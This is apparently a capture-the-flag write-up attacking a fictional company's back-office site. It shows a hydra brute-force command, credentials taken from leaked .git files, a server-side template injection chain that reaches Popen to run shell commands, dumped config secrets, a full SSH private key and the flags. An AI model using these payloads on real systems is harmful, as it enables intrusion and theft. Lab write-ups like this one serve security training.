# Backoffice

## Discovery

We found nothing interesting with the fuzzing

## SQL / Command Injection&#x20;

SQL injection potential. We save the query with BURP and use SQLMAP but no results come out

Neither with Command Injection

## Response Time&#x20;

We write a code to check if the response time is different between a good email and a bad email:

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

There is no significant difference between a good and a bad email address

## BruteForce

Elias Watters is the person responsible for processing the CVs that are uploaded from the front office. So he's an interesting person to bruteforce

{% code overflow="wrap" %}
```bash
[Oct 12, 2023 - 09:58:27 (CEST)] exegol-CTF_PJ /workspace # hydra -l elias.waters@vile.corp -P /usr/share/wordlists/rockyou.txt backoffice.vile.corp http-post-form "/login:email=^USER^&password=^PASS^:F=Utilisateur ou mot de passe incorrect" -f -t 64 -q -w 30 -I -m "Authorization: Basic dG9tLmdlbmRyeTpIdTMtaTN5aWVmCg=="
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).as
```
{% endcode %}

## Connection

If we use the email from Marco Baloti which was found in the .git/logs/HEAD as well the password found in the .git/config, we can connect to the BackOffice

* marco.baloti@vile.corp
* Vilecorp123!

## How does it work ?

When you register on the website https://frontoffice.vile.corp/nous-rejoindre, the request is send to the backoffice in the "Candidat" tab.



## SSTI

When trying some vulnerabilites, a SSTI was found

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

As we can see, the mathematical operation 7\*7 was interpreted.

As such, we need to list all class available and then find the Popen class to execute some code.

```bash
# List all class available
{{''.__class__.__mro__[1].__subclasses__()}}

# List all class from 0-NUMBER (Number is include)
{{''.__class__.__mro__[1].__subclasses__()[0-NUMBER:]}}

# Select the class with the ID Number
{{''.__class__.__mro__[1].__subclasses__()[NUMBER]}}
```

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

We found that the ID of the class Popen is 261. We can now execute fonction on the target.

{% code overflow="wrap" %}
```bash
{{''.__class__.__mro__[1].__subclasses__()[261]("ls",shell=True,stdout=-1).communicate()}}
```
{% endcode %}

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

We can use cat flag.txt to read the file:

CogiTF{7e9b62510e139f12a807d574ca92a24d}



In the file config.conf, we can found:

{% code overflow="wrap" %}
```tsconfig
confcat (b&#039;[cookie]
name = session
secret = FXYJzPAHawdaiyVznT57WUJPC273yCpiDjBPPTxhJEWww5sNDwcDoLBUgZ95YXkg
secure = False

[database]
name = vilecorp
user = vilecorp
password = DcNisoKDXEgFF7Bx7XUX
host = localhost
port = 5432
&#039;, Non
```
{% endcode %}

We have now the credentials to the databases

## SSH

While executing ls /home, we found an unique user: trooper

Attemps to create a reverse\_shell through the SSTI doesn't work even with the use of ngrok



<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

We need to either modify authorized\_keys in trooper home folder or find the id\_rsa file.

### ls /home/trooper

```bash
277486 drwxr-xr-x 1 trooper trooper 4096 Oct 11 08:34 .
277304 drwxr-xr-x 1 root root 4096 Oct 11 08:34 ..
277516 -rw-r--r-- 1 trooper trooper 220 Oct 11 08:34 .bash_logout
277517 -rw-r--r-- 1 trooper trooper 3526 Oct 11 08:34 .bashrc
277518 -rw-r--r-- 1 trooper trooper 807 Oct 11 08:34 .profile
277487 drwxr-xr-x 2 trooper trooper 4096 Oct 11 08:34 .ssh
277492 -rw-r--r-- 1 trooper trooper 3357 Oct 11 08:34 id_rsa
277530 -rw-r--r-- 1 trooper trooper 726 Oct 11 08:34 id_rsa.pub
```

We can found in these folder the id\_rsa file. Now we need to copy it to a local file on our machine.

### base64 < /home/trooper/id\_rsa

{% code overflow="wrap" %}
```
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB\nQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUNGd0FBQUFkemMyZ3RjbgpOaEFBQUFB\nd0VBQVFBQUFnRUEwdFd4MmdZQUNlZUJKNXA0TXZ0UHdnVDFQaGJwbjcxNzl2V0lmYnFQMVlKbERz\nNGlVejBmCkVYUWY0eXBNUEZKTGtLL21hZlZoOTBBSTl5cS8yNGlqanN0OXl0M3VMWFJxZ0FTajVV\nN0tHTlpQTC9wWFNicFVHQlhXYk8Ka25RZlRmZkNYNFdqRHRDMy8vdGtZZ0J1Y3RUUS9xYlBEWkhF\na2JXM0o1ZUJ1cDR4QktWY0tIbHNoR3JLa1JweGFlMGRSUgpaSnU5ejlqaEpjWWlmd0ZRa05aUjAw\nT3I0Z2tVa00vOUdoZTk3NGxOTEkzVXQydUViMVYvenJ6eFhUTnFla2hhK1Y3R29jCk5DMWpGQ3hl\nZ05HcEg5bmQvNE42YURYTzRIVGJ4S0hZTEprR3ExQjRsTzNseDlaY3dpTWpTeS8xNk84d1BCQ04v\nMXZtbzYKbk94ZDlaN3VhUXl0czdFL04vV0hHZmxZSTZOQUtIbFFmMklxUG01MFNjRk1YeDZTUVFk\nK0VKVWRwM3RCdHE0ekFuZklENApKcDJEMjRBNVY4Z3A5b1R4WW9LNGY2eW1GK2hpbEZUelh4ZlMz\nVzB6OU1YSHphSk96WVZyb3N5cVVUeCtLQ042YnQwM0lwCm1MS3dibVhGempaOFM5b04wQkVzNnRL\nMXdRQk1lYTluV0RSUVFxMmtjRURjYS9PQ1Fpc2d3Z1dDZ1FQcnROWng4TTRMMSsKTDVhb3hmd3ZU\nenBSTjdsZ0JCQ3VtS21tOUxZVjdtS2tnS081ckxQWmZNQkZEVGNUR0s4S1pndXFmTGhSSkhyL051\na1VoMQpUVjRRbnJucjhjaEo2QXAwdCs4TW1FSGQzcS9iZnloK3BtZTVWN0hCdFJrd0tEYjBFemcr\nTElNU2prc0FScWZaVGlzNjVhCjhBQUFjNDFTNTBWOVV1ZEZjQUFBQUhjM05vTFhKellRQUFBZ0VB\nMHRXeDJnWUFDZWVCSjVwNE12dFB3Z1QxUGhicG43MTcKOXZXSWZicVAxWUpsRHM0aVV6MGZFWFFm\nNHlwTVBGSkxrSy9tYWZWaDkwQUk5eXEvMjRpampzdDl5dDN1TFhScWdBU2o1VQo3S0dOWlBML3BY\nU2JwVUdCWFdiT2tuUWZUZmZDWDRXakR0QzMvL3RrWWdCdWN0VFEvcWJQRFpIRWtiVzNKNWVCdXA0\neEJLClZjS0hsc2hHcktrUnB4YWUwZFJSWkp1OXo5amhKY1lpZndGUWtOWlIwME9yNGdrVWtNLzlH\naGU5NzRsTkxJM1V0MnVFYjEKVi96cnp4WFROcWVraGErVjdHb2NOQzFqRkN4ZWdOR3BIOW5kLzRO\nNmFEWE80SFRieEtIWUxKa0dxMUI0bE8zbHg5WmN3aQpNalN5LzE2Tzh3UEJDTi8xdm1vNm5PeGQ5\nWjd1YVF5dHM3RS9OL1dIR2ZsWUk2TkFLSGxRZjJJcVBtNTBTY0ZNWHg2U1FRCmQrRUpVZHAzdEJ0\ncTR6QW5mSUQ0SnAyRDI0QTVWOGdwOW9UeFlvSzRmNnltRitoaWxGVHpYeGZTM1cwejlNWEh6YUpP\nelkKVnJvc3lxVVR4K0tDTjZidDAzSXBtTEt3Ym1YRnpqWjhTOW9OMEJFczZ0SzF3UUJNZWE5bldE\nUlFRcTJrY0VEY2EvT0NRaQpzZ3dnV0NnUVBydE5aeDhNNEwxK0w1YW94Znd2VHpwUk43bGdCQkN1\nbUttbTlMWVY3bUtrZ0tPNXJMUFpmTUJGRFRjVEdLCjhLWmd1cWZMaFJKSHIvTnVrVWgxVFY0UW5y\nbnI4Y2hKNkFwMHQrOE1tRUhkM3EvYmZ5aCtwbWU1VjdIQnRSa3dLRGIwRXoKZytMSU1TamtzQVJx\nZlpUaXM2NWE4QUFBQURBUUFCQUFBQ0FCTE00M01obmRkRVFZd2FoaVZscTVNTmhpRG5RaVh3YTZG\nMQorNW5halFEcEE4SHlON1ZjZWV6QWdpZHJtaWkyM2U0bEFWTHBncmJkaXU4ZmJNUlN4dUx3Mm1M\nQXI0QjJKUmtOVU9BZHluCiswZkpNMnE1bnpkNVErUGtTdjljUTM1Y1hZVFBFZDg4Vld3S0tzVmli\nSGJvNjBvSjdlU3ozdWR2WU1tekJPcHpPTVBGU3gKYUEzV0JoZFhiQytPSU5OdEwyVGRUbXUrVnpW\nYkdiQmhtYUdRdXZNdjBaL3lWMWNpZE50aXlwa1ZrVUFyMVpBVmtsV3JOaAo1bFV0Q1F5U25tVWRa\neTBSdVRvZDRmdm1pUGJMdTEwUHZIQVFkVlhkbG5rRmNxTnlHeWkrN0kxU082NXNHRlZkbEIvcnFq\nCllHTE5OOG9MeDZiVzhiN3RFaFQwTHR5OE0xNFpPbjVMMk9WODZYY203ZzcybkxablowNUJLM1RU\nVVRUOEFKM01zWlFTOWwKSUNFdnovNUVEWEtwQ1BBYkxwZytMYkJtamVFTXlkc0o2T1RNQ2w3cms4\na0UyRDd1UTl0RFJPUndiNDk2QlNwaENZQXJVNwpqVW5ValNvbmNDenZ2dlBabGdTQkRuK2NSc0NG\nK3haUmJ3SDROTlRDM0N5QUlzeGZxTDhiSnhMdlo1ZFZOd3pMN2xiWXRLCnhULzBGa0pyTFlYdWtv\nMzFtZWtUK2xMeElhQWN5MVpGZ0Rqdk0wNkdkclJUbE5ZUG4xVVZ3T2hiSlNwaGtxR3M4VEFBZ2IK\nL1ZnakdZb0RBWmI0b0pMZGlIdzl2VU9hbXdUZGYrUTh1ZTRrYThHa2R1UDNqb2VDRzBuWURUR3J0\najMzdUdnNEZrT1JrbwpuWnNlWXNKQ0xoNkN6WXZKUmhBQUFCQVFDYVVKY0FOcW5Kb3UzSmR0Zm9B\nMkJGWGxNdDhiRUtaVW1IVklhOENvZnlYL3NaCnVxdzdrWERxSFBsMFpORTdmSkNXd2tnMjBVeUta\nTytWZkcrY3NBTmM3WG1QNXlzZzI3cGRCRFY4cEtESUk2YVJ2ZnBNZ1IKdm9ZWjVScmxES1VwNHdu\nUjFyMlg1Vno5dit4RkZtbmZyUTJTdjJ4czJjNXlMUXVLY3RqR3BRUU5FWGFVbThEZHFndmw0NQpH\nOTFXVE8xTmxoOXBRN2hZUCtUZVJRTlpVVis4SGwrelNOT09jU1FkeTlmaE1KWWt2bkk2NlNUMU82\nTlUyck5aS2QzZWkwClIrZ0hqaU1zalBhU3VIS2VraXRYN0NYRWFCSk4vTExBb2xmSVU1dFhHa3do\nNjdCNHZWem45M3BabHMwYzZNZ1FRZlVqZ00KOGlETDM1SlRNOHFKSHdOTUFBQUJBUUQwZ2s4dU45\nRys4Sm9WWlp1TEJFZGs1OFk2a05oeWwvSzNuRVkwRlVvaVhHd01pUQpFTFU0U3A2ZWwzV0swVVJl\nak1XT2Nkc3dEUGk0TGFsTElPRktMdXIwWXJKdDN0UjR6NDVmZ2cvOStXQVBSU3pQdHBkUXNrCjVk\nTC9MV3k0Vy9rek8rdFE2TXhDaVZkdXFEWFhwY0pYa2FVQ1lvSWp3NnJ6SlFNNWVkNk81VUhON0Uw\nZ2hYaXYwbDl5OGgKOXJFeloxZTVYSEtCUTVsYzFCS2NVSVEwQmhDVUl3VkhINytiVUhQSU9RcmF3\nRFhkM2NKWlBDWGYzd0xnY3BQU1JuRVRHeQpISFA0bWtEZ1VJbXQ0cUpaZWFiZUJ3SVJFa1pEd3VM\nM2xFbUYrbzBvanVqUVJ4a1p1b0syak9MQXBYaVBEYjQyamNxWnI3Cnp0b0ZCbTVaL2w1cTVMQUFB\nQkFRRGN2ai8yaVM0ODhSWTJ4a3JwbzVEL2U1TWNUMTM2TWRYWWpqTlJNaHhlZEtmWWNENlUKVW1Q\nN0JsbVhCd3NIVm1JV0JuUU83bHlPUm5JM09jNkVROEpnV0FIMEhRaDVpQWhIWGxDeFh5NGdrVFRr\nTWEwTGtkYm1ZTgpQcmR2SFZzV2tIVFJUNm5oT1BhNUJVdVhCbXdEZDJYNmVaOXh0SEdiRzNUY2FI\nUlRjbmtvNFZ5bHdGZlVkVlRkQm9Xb2J5CkI2d25EOTc2bWcvTXFJNGVQQ2Z1UlRhbUlvb2lyTEg5\ndEJuOHl6U2FGRzByMGxSSnNtcnA2WkNlZ0RjamdLYS9yMkJKNUgKWUJLZTR3Wmo1Yks3d1huMzdK\nTksrUHdsVUFiRkZ5WkplZDVzM1VTYVpERVZzTGMvcjNBVHVSajJ0NUFhNk5iSmkrL2o3Mgo4WjFU\na1JYSmp6ZXRBQUFBQUFFQwotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K
```
{% endcode %}

As we can see, thanks to the SSTI, we have now '\n' everywhere so we need to remove them before decoding the base64



Once decode, we have the file id\_rsa:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
8Z1TkRXJjzetAAAAAAEC
-----END OPENSSH PRIVATE KEY-----
```

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

The id\_rsa file is not corrupt, so we can connect by ssh to the target machine:

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

FLAG: CogiTF{df2d539ddfb70403712484483e7ade83}
